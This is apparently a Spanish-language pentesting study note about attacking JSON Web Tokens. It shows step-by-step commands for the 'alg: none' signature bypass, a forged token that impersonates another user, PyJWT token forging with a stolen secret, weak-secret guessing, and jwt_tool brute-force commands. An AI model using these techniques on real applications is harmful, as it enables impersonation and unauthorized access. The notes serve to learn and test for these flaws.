# ¿ Que son los **Json Web Tokens (JWT)** ? 

Los **Jason Web Tokens (JWT)** son un tipo de token utilizado en la **autenticación** y **autorización** de usuarios en aplicaciones web. JWT es un estándar abierto (RFC 7519) que define un formato compacto y seguro para transmitir información entre diferentes partes de forma confiable. 

----

# Prevenir estos ataques 

Para prevenir la enumeración y explotación de los JWT, es importante utilizar prácticas seguras de desarrollo web, como la validación adecuada de las solicitudes de entrada, la gestión segura de las claves de firma JWT y la limitación del tiempo de expiración de los JWT.

----

# Enumeración 

La enumeración de los JWT se produce cuando un atacante utiliza técnicas de fuerza bruta o cierta ingeniería inversa para obtener información sobre los JWT utilizados por la aplicación web. Por ejemplo, el atacante podría intentar adivinar los valores de los JWT mediante la construcción de **tokens falsos**, tratando de validar en todo momento si la aplicación web los acepta o no. Si el atacante tiene éxito en la enumeración de un JWT válido, podría obtener información confidencial, como nombres de usuario, contraseñas, roles de usuario y otros datos sensibles. 

----

# Explotación 

La explotación de los JWT se produce cuando un atacante utiliza la información obtenida de la enumeración del JWT para explotar debilidades en la aplicación. Por ejemplo, si la aplicación web utiliza JWT para la autenticación, pero no valida adecuadamente la **firma** del JWT, un atacante podría falsificar el token y acceder a la aplicación web como si fuera un usuario legítimo. 

Ahora bien, es importante entender como se construye un JWT: 

![[JWT_Strcture.png]]

Los JWT se separan por puntos, siendo la primera cadena y la segunda, correspondientes a, en primer lugar el **hearder** y en segundo lugar el **payload**. Estas dos cadenas suelen se un JSON convertido a Base64. Por ultimo tenemos la **verify signature**, es decir la firma de verificación digital, la cual se encarga de validar la integridad del token para evitar posibles modificaciones y se compone de un "secret", es decir, una clave secreta junto a un algoritmo de encriptación. 

- # Verify Siganutre None

De cara a un ataque para robar la identidad de otro usuario o ataques de JWT, lo que se suele probar en primer lugar es una técnica para **burlar** dicha **verify signature** ( Esto funcionara en páginas las cuales estén mal desarrolladas y no se valide adecuadamente la firma ). 

El ataque consiste en cambiar el método de encriptación a **NONE**, haciendo uso de la página [JWT.io](https://jwt.io) podemos ingresar tokens para ver como estos se conforman: 

![[JWT.io.png]]

De esta manera podemos ver que la primera parte correspondiente al **HEADER** es un JSON en base64 con el siguiente formato: 

```json
{
	"alg": "HS256",
	"typ": "JWT"
}
```

Mientras que el **PAYLOAD** es un JSON en base64 con el siguiente formato: 

```json
{
	"id": 1,
	"iat": 1685376579,
	"exp": 1685350179
}
```

Y la **VERIFY SIGNATURE** es un HASH con el formato HS256 del conjunto de HEADER + . + PAYLOAD + ( CLAVE SECRETA | SECRET ). 

Por lo que para, por ejemplo, suplantar la identidad del usuario 2, entendemos que en el **PAYLOAD** deberíamos remplazar el **"id":1** por un **"id":2**, pero nuestro problema es que no conocemos el secret por si existiera una validación en el código de este mismo... Pero como mencionamos anteriormente, existen páginas que se encuentran mal desarrolladas y no validan dicha signature, por lo que en primer lugar lo que podríamos intentar realizar es burlar este haciendo uso de un tipo de cifrado NONE, por lo que deberiamos remplazar el **HEADER** por el siguiente JSON: 

```json
{
	"alg": "NONE",
	"typ": "JWT"
}
```

Luego, convertirlo a base64, y el resultado de este sería nuestro primer fragmento de el JWT: 

```bash
echo -n '{"alg":"NONE","typ":"JWT"}' | base64 
```

Por ultimo, realizariamos el cambio necesario en el **PAYLOAD**, en este ejemplo al intentar remplazar la identidad del usuario 2 simplemente remplazariamos el id: 

```json
{
	"id": 2,
	"iat": 1685376579,
	"exp": 1685350179
}
```

Y una vez más, lo convertimos a base64: 

```bash
echo -n '{"id":2,"iat":1685376579,"exp":1685350179}' | base64 
```

El conjunto de ambas cadenas en base64 separadas un por un punto, junto a un punto al final dejando vació la **SIGNATURE**, en caso de que la aplicación este mal desarrollada, daría como resultado un JWT válido. 

```bash
echo -n '{"alg":"NONE","typ":"JWT"}' | base64 # eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0=
echo -n '{"id":2,"iat":1685376579,"exp":1685350179}' | base64 # eyJpZCI6MiwiaWF0IjoxNjg1Mzc2NTc5LCJleHAiOjE2ODUzNTAxNzl9
# JWT: 
# {resultado_base64_header}.{resultado_base64_payload}.
# eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNjg1Mzc2NTc5LCJleHAiOjE2ODUzNTAxNzl9. 
```

- # ByPass de JWT con secret 
Por otro lado, una manera de burlar las autenticaciones de JWT es teniendo el **secret** en donde podríamos generar JWT con privilegios elevados.

```bash
pip3 install PyJWT
```
Una vez instalado el modulo **PyJWT** podríamos importar la libreria **jwt** para generar nuestros propios jwt con el **secret** que tengamos.

```python
import jwt
jwt.encode({'username':'admin'},{secret},algorithm="HS256")
```

- # Secret comun 
Otro caso es cuando tenemos que la aplicación **SI VALIDA** el **VERIFY SECRET** de nuestro JWT, pero existe la posibilidad de que es secret sea común y este en diccionarios tipicos, por lo que podríamos probar en la página [JWT.io](https://jwt.io) de ingresar un secreto débil típico que se encuentre en un diccionario de fuerza bruta e ir probando. 

-----
# Jwt_tool

Otra herramienta que podemos utilizar es la herramienta [jwt_tool](https://github.com/ticarpi/jwt_tool) la cual nos permite realizar diversas tareas relacionadas con los JWT Tokens como **decodificarlos**, **análisarlos**, **manipularlos**, **generarlos** y realizar ataques de **fuerza bruta y fuzzing**.

```bash
# Instalación 
sudo git clone https://github.com/ticarpi/jwt_tool

# Usage

# Decodificar JWT
python3 jwt_tool.py '{jwt}' 

# Ataques comunes (PlayBook)
python3 jwt_tool.py -t {url} -rh "{token_header} {toekn} ('Authorization: Barer {jwt}')" -M pb

# Realizar ataques 

# Algoritmo:none
python3 jwt_tool.py '{jwt}' -X a

# Brute Force
python3 jwt_tool.py '{jwt}' -C -d {secrets_list}

```